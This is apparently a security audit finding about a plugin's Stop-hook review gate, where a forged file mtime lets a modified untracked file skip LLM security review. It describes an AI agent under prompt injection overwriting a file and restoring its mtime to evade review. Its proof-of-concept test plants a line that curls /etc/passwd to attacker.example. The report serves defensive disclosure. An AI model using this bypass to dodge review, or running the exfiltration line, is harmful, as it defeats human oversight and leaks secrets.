### Title
Mtime-only pre-existing-untracked check in `_unchanged_since_baseline` lets a modified untracked file bypass Stop-hook security review - ([File: plugins/security-guidance/hooks/diffstate.py])

### Summary
`compute_v2_review_set` excludes untracked files from the Stop-hook `review_set` solely by comparing the current `st_mtime_ns` against the value snapshotted in `untracked_at_baseline` at UserPromptSubmit. Because the check never verifies file content (e.g. via a hash), any actor able to write to an existing untracked file and subsequently restore its mtime to the originally-recorded value can silently exclude malicious content changes from LLM security review.

### Finding Description
`_list_untracked` (`diffstate.py:319-351`) records `{repo-relative path: st_mtime_ns}` for every untracked file present at UPS time and stores it as `untracked_at_baseline` in session state. [1](#0-0) 

At Stop time, `compute_v2_review_set` decides which untracked files to exclude from review purely via:
```
def _unchanged_since_baseline(p):
    base_mtime = untracked_at_baseline.get(p)
    if base_mtime is None:
        return False
    try:
        return os.stat(os.path.join(repo, p)).st_mtime_ns == base_mtime
    except OSError:
        return False
``` [2](#0-1) 

`preexisting_unchanged` (files whose mtime matches) is subtracted from `untracked`, so those paths never enter `dirty_now`, never enter `review_set`, and are never reviewed by the Haiku-based Stop-hook analysis. [3](#0-2) [4](#0-3) 

The docstring explicitly asserts the invariant this check is supposed to guarantee — "an in-place edit during the turn is still reviewed" (`diffstate.py:366`) — but the implementation only holds that invariant if the filesystem happens to assign a different mtime to the edit. Since `os.utime()`/`touch -d` allow arbitrary, attacker-chosen mtimes on any file the process can write, an actor that can run shell/file-write tool calls (e.g. Claude acting on a prompt-injection payload embedded in repository content, a slash-command, or a malicious plugin script that legitimately runs file I/O as part of normal automation) can:
1. `stat()` the target pre-existing untracked file to read its current mtime (equal to the value UPS captured, since nothing has touched it yet).
2. Overwrite its content with malicious payload (e.g., a secret-exfiltration script or backdoor).
3. Call `os.utime(path, (atime, original_mtime_ns))` to restore the original mtime exactly.

At Stop, `_unchanged_since_baseline` sees an identical `st_mtime_ns` and classifies the file as "pre-existing untracked, unchanged," excluding it from `review_set` even though its content was fully replaced during the turn. No content hash or size comparison exists anywhere in this code path to catch the mismatch.

### Impact Explanation
This breaks the "Deny means deny" guarantee of the Stop-hook review gate: a newly written malicious file (secret exfiltration, backdoor, injected dependency) can be smuggled into the repository as an untracked file without ever being flagged for review, because the sole detection signal (mtime) is fully attacker-controllable via standard filesystem APIs available to any process capable of writing to the repo (including Claude itself under prompt injection, or a plugin performing routine file writes). This matches a security-review-bypass / trust-boundary-bypass impact category — content that should always be gated through Haiku's vulnerability scan silently skips the gate.

### Likelihood Explanation
The exploit requires only: (1) an untracked file already present at UPS baseline capture time whose path the attacker knows/controls, and (2) subsequent write access plus the ability to call `os.utime`/`touch -d`, both trivially available to a Bash tool call or any script writing files in the repo. No filesystem timing race or coarse-clock luck is needed since the mtime can be set deterministically. This is fully reproducible and repeatable across turns/sessions.

### Recommendation
Replace or augment the mtime-equality check with a content-based comparison (e.g., store and compare a content hash such as `sha256` or file size + mtime + hash) in `_list_untracked` / `_unchanged_since_baseline`, so an untracked file is only excluded from `review_set` when both its mtime AND its content hash are unchanged since the baseline snapshot.

### Proof of Concept
```python
# test_diffstate_mtime_bypass.py
import os, subprocess
from diffstate import _list_untracked, compute_v2_review_set

def test_mtime_forged_bypass(tmp_git_repo):
    repo = tmp_git_repo  # fixture: git init'd repo with an initial commit
    target = os.path.join(repo, "scratch.log")

    # 1. Pre-existing untracked file present at UPS baseline capture.
    with open(target, "w") as f:
        f.write("benign scratch content\n")
    baseline_map = _list_untracked(repo)
    assert "scratch.log" in baseline_map
    original_mtime_ns = baseline_map["scratch.log"]

    baseline_sha = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()

    # 2. Attacker overwrites content with malicious payload, then restores mtime.
    with open(target, "w") as f:
        f.write("import os; os.system('curl attacker.example/exfil?d=' + open('/etc/passwd').read())\n")
    os.utime(target, ns=(original_mtime_ns, original_mtime_ns))

    # 3. Stop-hook review-set computation.
    review_paths, _, _, _, metrics = compute_v2_review_set(
        repo, baseline_sha, baseline_sha, untracked_at_baseline=baseline_map
    )

    # Expected (secure) behavior: the modified file must still be reviewed.
    assert os.path.join(repo, "scratch.log") in review_paths, (
        "Malicious content change was excluded from review_set solely "
        "because mtime was forged to match the UPS baseline snapshot"
    )
```
Expected result on current code: the assertion fails — `scratch.log` is excluded from `review_paths` (and counted in `metrics["preexisting_untracked_excluded"]`) despite its content having changed, demonstrating the review-gate bypass.
